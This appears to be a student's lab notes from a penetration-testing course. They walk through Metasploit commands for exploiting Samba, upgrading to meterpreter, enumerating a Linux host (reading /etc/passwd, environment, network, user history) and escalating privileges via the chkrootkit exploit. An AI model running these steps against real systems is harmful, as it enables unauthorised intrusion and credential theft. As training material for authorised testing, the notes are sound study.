
![[Pasted image 20230830164328.png]] 

##### Upgrade shell session to meterpreter session 
1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability: 
		 - `search samba`  -->  `use exploit/Linux/samba/is_known_pipename `
		 - `pwd` 
		 - `put session in the background` 
6) upgrade shell session to meterpreter session: `sessions -u 1` 
7) sessions 2 (this is now your meterpreter session )
 `

##### Enumerate the system: 
1)  `/bin/bash -i
2) `cat /etc/passwd`
3) `groups root ` (see members of group)
4) `cat /etc/*issue*`
5) `uname -r `
6) `uname -a`
8) `ip a s` (list interfaces on target system - get subnet for pivoting)
9) `netstat -antp`
10) `ps aux` (list processes on system)
11) `env`  

##### post exploitation modules 
- Enumerate configuration files on linux system: 
	- `search enum_configs` 
		- `use post/linux/gather/enum_configs` 
		- set session to meterpreter session on target 
		- `loot` 
		- `cat [path] ` (identify the shells that are on the system)

- gather environment settings 
	- `use post/multi/gather/env` 
	- `session` (set session to meterpreter session)
	- `run` 

- gather network information 
	- `use post/linux/gather/enum_network` 
	- `session` (set session to meterpreter session)
	- `run` 
	- `loot` (get al the information)
		- enumerate  information:  copy file path and: `cath path` `

- check protection systems on linux system (security features) 
	- `use post/linux/gather/enum_protection` 
		- set session to meterpreter session 
	- notes: here will al important notes are stored 

- system enumeration 
	- `use post/linux/gather/enum_system`
	- see installed packages: `loot` -> `cat [path]`


- check if target is a vm or container 
	- `search checkcointainer `
		- `use post/linux/gather/checkcontainer`  (if you are in a container- you need container-breakout to get access to host system that is hosting the container)
	- `search checkvm` 
		- `use post/linux/gather/checkvm` 

- enumerate users history
	- `search enum_users_history` 
		- `use post/linux/gather/enum_users_history`  (stores logs of commands)
		- `loot`  -> `cat` content file 

- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec
  
  
### Linux Privilege escalation - Exploiting A vulnerable program 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability:  
	1) `search ssh_login`
	2) `use auxiliary/scanner/ssh/ssh_login `
	3) use ssh credentials 
	4) /bin/bash -i 
6) upgrade session 1 (shel) to meterpreter session: `sessions -u 1` 
7) open new bash session on meterpreter 
8) user enumeration: `cat /etc/passwd `
9) find a vulnerable process so we can elevate our privileges: `ps` 
10) look at the root user: to find out more about binary/script: `cat [command]`
![[Pasted image 20230830210745.png]]
11) check version of chrootkit: `chrootkit -V `
go into meterpreter and exploit chrootkit (exploit/unix/local/chrootkit) 






























### Dumping Hashes with Hashdump 





### Establishing persistence on Linux 


	

